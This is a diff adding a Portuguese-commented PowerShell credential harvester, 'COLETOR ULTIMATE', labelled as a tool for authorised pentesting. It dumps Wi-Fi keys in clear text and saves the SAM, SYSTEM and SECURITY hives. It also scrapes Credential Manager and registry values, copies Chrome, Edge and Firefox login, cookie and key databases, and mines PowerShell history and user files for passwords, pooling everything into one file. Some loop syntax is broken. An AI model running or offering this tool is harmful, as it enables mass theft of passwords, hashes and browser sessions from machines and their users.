@@ -1,0 +1,596 @@
+<#
+.SYNOPSIS
+    COLETOR ULTIMATE - Coleta Total de Credenciais Windows
+.DESCRIPTION
+    Script mais completo e agressivo para pentest autorizado
+    Usa todas as técnicas conhecidas para extrair credenciais
+#>
+
+# ========== CONFIGURAÇÃO INICIAL ==========
+Clear-Host
+$Host.UI.RawUI.WindowTitle = "COLETOR ULTIMATE - EM EXECUÇÃO"
+$ErrorActionPreference = "Continue"
+
+# Configurações de saída
+$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$outputDir = "C:\Temp\UltimateExtract_$timestamp"
+New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+
+$mainLog = "$outputDir\execution_log.txt"
+$credsFile = "$outputDir\ALL_CREDENTIALS.txt"
+$debugFile = "$outputDir\debug_info.txt"
+
+# Função de log avançada
+function Write-RealTime {
+    param([string]$Message, [string]$Color = "White", [string]$Type = "INFO")
+    
+    $timestamp = Get-Date -Format "HH:mm:ss.fff"
+    $logEntry = "[$timestamp][$Type] $Message"
+    
+    # Display colorido no console
+    switch ($Color) {
+        "Red" { Write-Host $logEntry -ForegroundColor Red }
+        "Green" { Write-Host $logEntry -ForegroundColor Green }
+        "Yellow" { Write-Host $logEntry -ForegroundColor Yellow }
+        "Cyan" { Write-Host $logEntry -ForegroundColor Cyan }
+        "Magenta" { Write-Host $logEntry -ForegroundColor Magenta }
+        default { Write-Host $logEntry }
+    }
+    
+    # Log em arquivo
+    Add-Content -Path $mainLog -Value $logEntry
+}
+
+# ========== INICIALIZAÇÃO ==========
+Write-RealTime "INICIANDO COLETOR ULTIMATE DE CREDENCIAIS" "Magenta" "START"
+Write-RealTime "Diretorio de saida: $outputDir" "Cyan" "CONFIG"
+
+# Verificar privilégios
+$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+$isAdmin = ([Security.Principal.WindowsPrincipal]$currentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$isSystem = $currentUser.Name -eq "NT AUTHORITY\SYSTEM"
+
+Write-RealTime "Usuario: $($currentUser.Name)" "Cyan" "INFO"
+Write-RealTime "E Admin: $isAdmin" $(if($isAdmin){"Green"}else{"Red"}) "INFO"
+Write-RealTime "E System: $isSystem" $(if($isSystem){"Green"}else{"Yellow"}) "INFO"
+
+# ========== TÉCNICAS DE PRIVILEGIO ==========
+function Invoke-PrivilegeEscalation {
+    Write-RealTime "Tentando tecnicas de escalacao de privilegio..." "Yellow" "PRIVILEGE"
+    
+    # Método 1: Token Manipulation
+    try {
+        Write-RealTime "Tentando manipulacao de token..." "Cyan" "PRIVILEGE"
+        $process = Get-Process -Name "winlogon" -ErrorAction SilentlyContinue
+        if ($process) {
+            $token = [System.Diagnostics.Process]::GetProcessById($process.Id).Handle
+            Write-RealTime "Token do winlogon acessado" "Green" "PRIVILEGE"
+        }
+    } catch {
+        Write-RealTime "Falha na manipulacao de token: $($_.Exception.Message)" "Red" "PRIVILEGE"
+    }
+    
+    # Método 2: Service Permissions
+    try {
+        Write-RealTime "Verificando permissoes de servicos..." "Cyan" "PRIVILEGE"
+        $services = Get-WmiObject -Class Win32_Service | Where-Object { 
+            $_.StartName -like "*LocalSystem*" -or $_.StartName -like "*LocalService*" 
+        }
+        Write-RealTime "Servicos do sistema identificados: $($services.Count)" "Green" "PRIVILEGE"
+    } catch {
+        Write-RealTime "Falha ao verificar servicos: $($_.Exception.Message)" "Red" "PRIVILEGE"
+    }
+}
+
+# ========== COLETA DE SENHAS WI-FI ==========
+function Get-WiFiPasswordsUltimate {
+    Write-RealTime "Iniciando coleta agressiva de senhas WiFi..." "Yellow" "WIFI"
+    
+    $results = @()
+    $wifiCount = 0
+    
+    try {
+        # Método 1: netsh tradicional
+        Write-RealTime "Executando netsh wlan show profiles..." "Cyan" "WIFI"
+        $profiles = netsh wlan show profiles 2>&1
+        
+        if ($profiles -match "Perfis") {
+            $profileNames = ($profiles | Select-String "Perfil de todos os usuarios" | ForEach-Object { 
+                ($_ -split ":")[1].Trim() 
+            })
+            
+            Write-RealTime "Perfis WiFi encontrados: $($profileNames.Count)" "Green" "WIFI"
+            
+            foreach ($profile in $profileNames) {
+                Write-RealTime "Processando perfil: $profile" "Cyan" "WIFI"
+                
+                $profileInfo = netsh wlan show profile name="$profile" key=clear 2>&1
+                
+                # Múltiplos métodos de extração
+                $password = $null
+                
+                # Método A: Conteúdo da Chave
+                if (-not $password) {
+                    $keyMatch = $profileInfo | Select-String "Conteudo da Chave"
+                    if ($keyMatch) {
+                        $password = ($keyMatch -split ":")[1].Trim()
+                    }
+                }
+                
+                # Método B: Key Content (inglês)
+                if (-not $password) {
+                    $keyMatch = $profileInfo | Select-String "Key Content"
+                    if ($keyMatch) {
+                        $password = ($keyMatch -split ":")[1].Trim()
+                    }
+                }
+                
+                # Método C: Regex avançado
+                if (-not $password) {
+                    $regexMatch = [regex]::Match($profileInfo, '(?i)(key content|conte.do da chave)[\s:]+([^\r\n]+)')
+                    if ($regexMatch.Success) {
+                        $password = $regexMatch.Groups[2].Value.Trim()
+                    }
+                }
+                
+                if ($password) {
+                    $resultLine = "WI-FI ENCONTRADA: Perfil=$profile | Senha=$password"
+                    $results += $resultLine
+                    $wifiCount++
+                    Write-RealTime "SENHA WI-FI ENCONTRADA: $profile - $password" "Green" "WIFI_SUCCESS"
+                } else {
+                    Write-RealTime "Nenhuma senha encontrada para: $profile" "Yellow" "WIFI"
+                }
+            }
+        }
+        
+        # Método 2: Arquivos XML do WiFi
+        Write-RealTime "Buscando arquivos XML de perfis WiFi..." "Cyan" "WIFI"
+        $wifiXmlFiles = Get-ChildItem "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\" -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue
+        
+        foreach ($xmlFile in $wifiXmlFiles) {
+            try {
+                $xmlContent = Get-Content $xmlFile.FullName -Raw
+                if ($xmlContent -match "keyMaterial") {
+                    $profileName = [regex]::Match($xmlContent, '<name>(.*?)</name>').Groups[1].Value
+                    $keyMaterial = [regex]::Match($xmlContent, '<keyMaterial>(.*?)</keyMaterial>').Groups[1].Value
+                    
+                    if ($keyMaterial -and $profileName) {
+                        $results += "WI-FI XML: Perfil=$profileName | KeyMaterial=$keyMaterial"
+                        Write-RealTime "Perfil WiFi em XML: $profileName" "Green" "WIFI"
+                    }
+                }
+            } catch {
+                Write-RealTime "Erro ao processar XML: $($xmlFile.FullName)" "Red" "WIFI"
+            }
+        }
+        
+    } catch {
+        Write-RealTime "Erro geral na coleta WiFi: $($_.Exception.Message)" "Red" "WIFI_ERROR"
+    }
+    
+    Write-RealTime "Coleta WiFi concluida. Senhas encontradas: $wifiCount" "Green" "WIFI_SUMMARY"
+    return $results
+}
+
+# ========== COLETA DO SAM E HASHES ==========
+function Get-SAMHashesUltimate {
+    Write-RealTime "Iniciando coleta agressiva do SAM e hashes..." "Yellow" "SAM"
+    
+    $results = @()
+    
+    # Método 1: reg save com múltiplas tentativas
+    $samFiles = @()
+    
+    try {
+        Write-RealTime "Tentando reg save do SAM..." "Cyan" "SAM"
+        Start-Process -FilePath "reg" -ArgumentList "save", "hklm\sam", "$outputDir\sam.save", "/y" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+        if (Test-Path "$outputDir\sam.save") {
+            $samFiles += "sam.save"
+            Write-RealTime "SAM salvo com sucesso" "Green" "SAM"
+        }
+    } catch {
+        Write-RealTime "Falha no reg save SAM: $($_.Exception.Message)" "Red" "SAM"
+    }
+    
+    try {
+        Write-RealTime "Tentando reg save do SYSTEM..." "Cyan" "SAM"
+        Start-Process -FilePath "reg" -ArgumentList "save", "hklm\system", "$outputDir\system.save", "/y" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+        if (Test-Path "$outputDir\system.save") {
+            $samFiles += "system.save"
+            Write-RealTime "SYSTEM salvo com sucesso" "Green" "SAM"
+        }
+    } catch {
+        Write-RealTime "Falha no reg save SYSTEM: $($_.Exception.Message)" "Red" "SAM"
+    }
+    
+    try {
+        Write-RealTime "Tentando reg save do SECURITY..." "Cyan" "SAM"
+        Start-Process -FilePath "reg" -ArgumentList "save", "hklm\security", "$outputDir\security.save", "/y" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+        if (Test-Path "$outputDir\security.save") {
+            $samFiles += "security.save"
+            Write-RealTime "SECURITY salvo com sucesso" "Green" "SAM"
+        }
+    } catch {
+        Write-RealTime "Falha no reg save SECURITY: $($_.Exception.Message)" "Red" "SAM"
+    }
+    
+    # Método 2: WMIC para usuários
+    try {
+        Write-RealTime "Coletando informacoes de usuarios via WMI..." "Cyan" "SAM"
+        $users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True" | Select-Object Name, SID, Status, Disabled, PasswordRequired
+        
+        foreach ($user in $users) {
+            $userInfo = "USUARIO: $($user.Name) | SID: $($user.SID) | Status: $($user.Status) | Desativado: $($user.Disabled) | SenhaObrigatoria: $($user.PasswordRequired)"
+            $results += $userInfo
+            Write-RealTime "Usuario local encontrado: $($user.Name)" "Green" "SAM"
+        }
+    } catch {
+        Write-RealTime "Falha ao coletar usuarios via WMI: $($_.Exception.Message)" "Red" "SAM"
+    }
+    
+    # Método 3: PowerShell local users
+    try {
+        Write-RealTime "Coletando usuarios via PowerShell..." "Cyan" "SAM"
+        $localUsers = Get-LocalUser | Select-Object Name, Enabled, LastLogon, Description, UserMayChangePassword, PasswordRequired
+        
+        foreach ($user in $localUsers) {
+            $userInfo = "LOCAL_USER: $($user.Name) | Ativo: $($user.Enabled) | UltimoLogon: $($user.LastLogon) | PodeAlterarSenha: $($user.UserMayChangePassword)"
+            $results += $userInfo
+        }
+        Write-RealTime "Usuarios locais coletados: $($localUsers.Count)" "Green" "SAM"
+    } catch {
+        Write-RealTime "Falha ao coletar usuarios locais: $($_.Exception.Message)" "Red" "SAM"
+    }
+    
+    if ($samFiles.Count -gt 0) {
+        $results += "ARQUIVOS SAM SALVOS: $($samFiles -join ', ')"
+    }
+    
+    return $results
+}
+
+# ========== CREDENTIAL MANAGER AVANÇADO ==========
+function Get-CredentialManagerUltimate {
+    Write-RealTime "Iniciando coleta agressiva do Credential Manager..." "Yellow" "CREDMAN"
+    
+    $results = @()
+    
+    # Método 1: cmdkey com output direto
+    try {
+        Write-RealTime "Executando cmdkey /list..." "Cyan" "CREDMAN"
+        $cmdkeyOutput = cmdkey /list 2>&1 | Out-String
+        
+        if ($cmdkeyOutput -match "Target:") {
+            $results += "CREDENCIAIS CMDKEY:"
+            $results += $cmdkeyOutput
+            Write-RealTime "Credenciais do cmdkey encontradas" "Green" "CREDMAN"
+        } else {
+            Write-RealTime "Nenhuma credencial encontrada no cmdkey" "Yellow" "CREDMAN"
+        }
+    } catch {
+        Write-RealTime "Falha no cmdkey: $($_.Exception.Message)" "Red" "CREDMAN"
+    }
+    
+    # Método 2: Registry dump completo
+    Write-RealTime "Varredura completa do registro por credenciais..." "Cyan" "CREDMAN"
+    
+    $credentialPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Credentials", 
+        "HKCU:\Software\Microsoft\IdentityCRL",
+        "HKCU:\Software\Microsoft\Office",
+        "HKCU:\Software\Microsoft\OneDrive",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer",
+        "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
+        "HKCU:\Software\Microsoft\Terminal Server Client",
+        "HKCU:\Software\Microsoft\Credentials",
+        "HKCU\Software\Microsoft\Vault"
+    )
+    
+    foreach ($regPath in $credentialPaths) {
+        try {
+            if (Test-Path $regPath) {
+                Write-RealTime "Verificando registro: $regPath" "Cyan" "CREDMAN"
+                
+                # Coletar todas as chaves e valores
+                $items = Get-ChildItem $regPath -Recurse -ErrorAction SilentlyContinue
+                
+                foreach ($item in $items) {
+                    try {
+                        $values = Get-ItemProperty $item.PSPath -ErrorAction SilentlyContinue
+                        
+                        foreach ($prop in $values.PSObject.Properties) {
+                            if ($prop.Name -notlike "PS*" -and $prop.Value) {
+                                $valueStr = $prop.Value.ToString()
+                                
+                                # Procurar por padrões de credenciais
+                                if ($valueStr -match "(?i)password|senha|pwd|token|key|secret|credential|connectionstring|account|login|user") {
+                                    $credLine = "REG_CRED: $($item.PSPath) -> $($prop.Name)=$valueStr"
+                                    $results += $credLine
+                                    Write-RealTime "Credencial no registro: $($prop.Name)" "Green" "CREDMAN"
+                                }
+                            }
+                        }
+                    } catch {
+                        # Ignorar erros em chaves específicas
+                    }
+                }
+            }
+        } catch {
+            Write-RealTime "Erro no caminho do registro $regPath: $($_.Exception.Message)" "Red" "CREDMAN"
+        }
+    }
+    
+    return $results
+}
+
+# ========== DADOS DE NAVEGADORES ==========
+function Get-BrowserDataUltimate {
+    Write-RealTime "Iniciando coleta agressiva de dados de navegadores..." "Yellow" "BROWSER"
+    
+    $results = @()
+    $browserFiles = @()
+    
+    # Chrome
+    try {
+        Write-RealTime "Coletando dados do Chrome..." "Cyan" "BROWSER"
+        $chromeBase = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        if (Test-Path $chromeBase) {
+            $profiles = Get-ChildItem $chromeBase -Directory | Where-Object { $_.Name -match "Default|Profile" }
+            
+            foreach ($profile in $profiles) {
+                $filesToCopy = @("Login Data", "Web Data", "Cookies", "Local State", "History", "Bookmarks")
+                
+                foreach ($file in $filesToCopy) {
+                    $sourcePath = "$($profile.FullName)\$file"
+                    if (Test-Path $sourcePath) {
+                        $destFile = "chrome_$($profile.Name)_$file"
+                        Copy-Item $sourcePath "$outputDir\$destFile" -Force -ErrorAction SilentlyContinue
+                        $browserFiles += $destFile
+                        Write-RealTime "Chrome: $destFile copiado" "Green" "BROWSER"
+                    }
+                }
+            }
+        }
+    } catch {
+        Write-RealTime "Erro ao coletar dados do Chrome: $($_.Exception.Message)" "Red" "BROWSER"
+    }
+    
+    # Edge
+    try {
+        Write-RealTime "Coletando dados do Edge..." "Cyan" "BROWSER"
+        $edgeBase = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        if (Test-Path $edgeBase) {
+            $profiles = Get-ChildItem $edgeBase -Directory | Where-Object { $_.Name -match "Default|Profile" }
+            
+            foreach ($profile in $profiles) {
+                $filesToCopy = @("Login Data", "Web Data", "Cookies", "History")
+                
+                foreach ($file in $filesToCopy) {
+                    $sourcePath = "$($profile.FullName)\$file"
+                    if (Test-Path $sourcePath) {
+                        $destFile = "edge_$($profile.Name)_$file"
+                        Copy-Item $sourcePath "$outputDir\$destFile" -Force -ErrorAction SilentlyContinue
+                        $browserFiles += $destFile
+                        Write-RealTime "Edge: $destFile copiado" "Green" "BROWSER"
+                    }
+                }
+            }
+        }
+    } catch {
+        Write-RealTime "Erro ao coletar dados do Edge: $($_.Exception.Message)" "Red" "BROWSER"
+    }
+    
+    # Firefox
+    try {
+        Write-RealTime "Coletando dados do Firefox..." "Cyan" "BROWSER"
+        $firefoxBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        if (Test-Path $firefoxBase) {
+            $profiles = Get-ChildItem $firefoxBase -Directory
+            
+            foreach ($profile in $profiles) {
+                $filesToCopy = @("key4.db", "logins.json", "cookies.sqlite", "places.sqlite")
+                
+                foreach ($file in $filesToCopy) {
+                    $sourcePath = "$($profile.FullName)\$file"
+                    if (Test-Path $sourcePath) {
+                        $destFile = "firefox_$($profile.Name)_$file"
+                        Copy-Item $sourcePath "$outputDir\$destFile" -Force -ErrorAction SilentlyContinue
+                        $browserFiles += $destFile
+                        Write-RealTime "Firefox: $destFile copiado" "Green" "BROWSER"
+                    }
+                }
+            }
+        }
+    } catch {
+        Write-RealTime "Erro ao coletar dados do Firefox: $($_.Exception.Message)" "Red" "BROWSER"
+    }
+    
+    if ($browserFiles.Count -gt 0) {
+        $results += "ARQUIVOS DE NAVEGADOR COPIADOS: $($browserFiles -join ', ')"
+    }
+    
+    return $results
+}
+
+# ========== HISTÓRICO E MEMÓRIA ==========
+function Get-PowerShellHistoryUltimate {
+    Write-RealTime "Coletando historico e memoria do PowerShell..." "Yellow" "HISTORY"
+    
+    $results = @()
+    
+    # Histórico do PSReadLine
+    try {
+        Write-RealTime "Buscando historico do PowerShell..." "Cyan" "HISTORY"
+        $historyPaths = @(
+            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+            "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+            "$env:USERPROFILE\Documents\WindowsPowerShell\ConsoleHost_history.txt"
+        )
+        
+        foreach $historyPath in $historyPaths {
+            if (Test-Path $historyPath) {
+                $history = Get-Content $historyPath -Raw
+                $results += "HISTORICO POWERSHELL ($historyPath):"
+                $results += $history
+                
+                # Buscar credenciais no histórico
+                $sensitiveCommands = $history -split "`n" | Where-Object { 
+                    $_ -match "(?i)password|senha|pwd|credential|token|key|secret|convertto-securestring|get-credential" 
+                }
+                
+                if ($sensitiveCommands) {
+                    $results += "COMANDOS SENSIVEIS NO HISTORICO:"
+                    $results += $sensitiveCommands
+                    foreach ($cmd in $sensitiveCommands) {
+                        Write-RealTime "Comando sensivel no historico: $($cmd.Trim())" "Red" "HISTORY"
+                    }
+                }
+                
+                Write-RealTime "Historico encontrado em: $historyPath" "Green" "HISTORY"
+            }
+        }
+    } catch {
+        Write-RealTime "Erro ao coletar historico: $($_.Exception.Message)" "Red" "HISTORY"
+    }
+    
+    # Variáveis atuais
+    try {
+        Write-RealTime "Verificando variaveis da sessao..." "Cyan" "HISTORY"
+        $allVars = Get-Variable | Where-Object { $_.Value -and $_.Value.ToString().Length -lt 1000 }
+        
+        foreach ($var in $allVars) {
+            $varValue = $var.Value.ToString()
+            if ($varValue -match "(?i)password|senha|token|key") {
+                $results += "VARIAVEL SENSIVEL: $($var.Name)=$varValue"
+                Write-RealTime "Variavel sensivel encontrada: $($var.Name)" "Red" "HISTORY"
+            }
+        }
+    } catch {
+        Write-RealTime "Erro ao verificar variaveis: $($_.Exception.Message)" "Red" "HISTORY"
+    }
+    
+    return $results
+}
+
+# ========== ARQUIVOS TEMPORÁRIOS E LOGS ==========
+function Get-TempFilesAndLogs {
+    Write-RealTime "Varrendo arquivos temporarios e logs..." "Yellow" "TEMP"
+    
+    $results = @()
+    
+    # Procurar em diretórios temporários
+    $tempPaths = @(
+        $env:TEMP,
+        "$env:USERPROFILE\AppData\Local\Temp",
+        "C:\Windows\Temp",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads"
+    )
+    
+    $searchPatterns = @("*.txt", "*.xml", "*.config", "*.json", "*.bat", "*.cmd", "*.ps1", "*.vbs")
+    $credentialKeywords = @("password", "senha", "pwd", "connectionstring", "token", "key", "secret", "credential")
+    
+    foreach $tempPath in $tempPaths {
+        try {
+            if (Test-Path $tempPath) {
+                Write-RealTime "Varrendo: $tempPath" "Cyan" "TEMP"
+                
+                foreach $pattern in $searchPatterns {
+                    $files = Get-ChildItem $tempPath -Filter $pattern -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20
+                    
+                    foreach ($file in $files) {
+                        try {
+                            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                            if ($content) {
+                                foreach ($keyword in $credentialKeywords) {
+                                    if ($content -match $keyword) {
+                                        $matches = [regex]::Matches($content, "(?i)$keyword.*?=.*?['`"]([^'`"]+)")
+                                        foreach ($match in $matches) {
+                                            $results += "ARQUIVO: $($file.FullName) | CREDENCIAL: $($match.Value)"
+                                            Write-RealTime "Credencial em arquivo: $($file.Name)" "Green" "TEMP"
+                                        }
+                                    }
+                                }
+                            }
+                        } catch {
+                            # Ignorar arquivos com problemas
+                        }
+                    }
+                }
+            }
+        } catch {
+            Write-RealTime "Erro ao varrer $tempPath: $($_.Exception.Message)" "Red" "TEMP"
+        }
+    }
+    
+    return $results
+}
+
+# ========== EXECUÇÃO PRINCIPAL ==========
+Write-RealTime "INICIANDO PROCESSO DE COLETA COMPLETA..." "Magenta" "MAIN"
+
+try {
+    $allResults = @()
+    
+    # Executar todas as funções de coleta
+    Write-RealTime "=== FASE 1: SENHAS WI-FI ===" "Yellow" "PHASE"
+    $wifiResults = Get-WiFiPasswordsUltimate
+    $allResults += $wifiResults
+    
+    Write-RealTime "=== FASE 2: SAM E HASHES ===" "Yellow" "PHASE"
+    $samResults = Get-SAMHashesUltimate
+    $allResults += $samResults
+    
+    Write-RealTime "=== FASE 3: CREDENTIAL MANAGER ===" "Yellow" "PHASE"
+    $credmanResults = Get-CredentialManagerUltimate
+    $allResults += $credmanResults
+    
+    Write-RealTime "=== FASE 4: NAVEGADORES ===" "Yellow" "PHASE"
+    $browserResults = Get-BrowserDataUltimate
+    $allResults += $browserResults
+    
+    Write-RealTime "=== FASE 5: HISTORICO E MEMORIA ===" "Yellow" "PHASE"
+    $historyResults = Get-PowerShellHistoryUltimate
+    $allResults += $historyResults
+    
+    Write-RealTime "=== FASE 6: ARQUIVOS TEMPORARIOS ===" "Yellow" "PHASE"
+    $tempResults = Get-TempFilesAndLogs
+    $allResults += $tempResults
+    
+    # Salvar todos os resultados
+    Write-RealTime "Salvando todos os resultados no arquivo..." "Cyan" "SAVE"
+    $allResults | Out-File $credsFile -Encoding UTF8
+    
+    # ========== RELATÓRIO FINAL ==========
+    Write-RealTime "PROCESSO DE COLETA CONCLUIDO!" "Green" "COMPLETE"
+    
+    # Estatísticas
+    $totalWifi = ($allResults | Where-Object { $_ -match "WI-FI ENCONTRADA" }).Count
+    $totalCreds = ($allResults | Where-Object { $_ -match "CREDENCIAL|REG_CRED" }).Count
+    $totalUsers = ($allResults | Where-Object { $_ -match "USUARIO:|LOCAL_USER" }).Count
+    
+    Write-RealTime "RELATORIO FINAL:" "Yellow" "SUMMARY"
+    Write-RealTime "Senhas WiFi encontradas: $totalWifi" $(if($totalWifi -gt 0){"Red"}else{"White"}) "SUMMARY"
+    Write-RealTime "Credenciais diversas: $totalCreds" $(if($totalCreds -gt 0){"Red"}else{"White"}) "SUMMARY"
+    Write-RealTime "Usuarios identificados: $totalUsers" "Cyan" "SUMMARY"
+    Write-RealTime "Arquivos salvos em: $outputDir" "White" "SUMMARY"
+    
+    # Listar arquivos gerados
+    Write-RealTime "ARQUIVOS GERADOS:" "Yellow" "FILES"
+    Get-ChildItem $outputDir | ForEach-Object { 
+        Write-RealTime "$($_.Name) - $([math]::Round($_.Length/1KB,2)) KB" "White" "FILES"
+    }
+    
+    Write-RealTime "AVISO: Estes dados sao extremamente sensiveis. Proteja os arquivos e destrua apos a analise!" "Red" "WARNING"
+    
+} catch {
+    Write-RealTime "ERRO CRITICO DURANTE A EXECUCAO: $($_.Exception.Message)" "Red" "ERROR"
+    Write-RealTime "STACK TRACE: $($_.ScriptStackTrace)" "Red" "ERROR"
+}
+
+Write-RealTime "Coleta finalizada em: $(Get-Date)" "Green" "END"
+
+
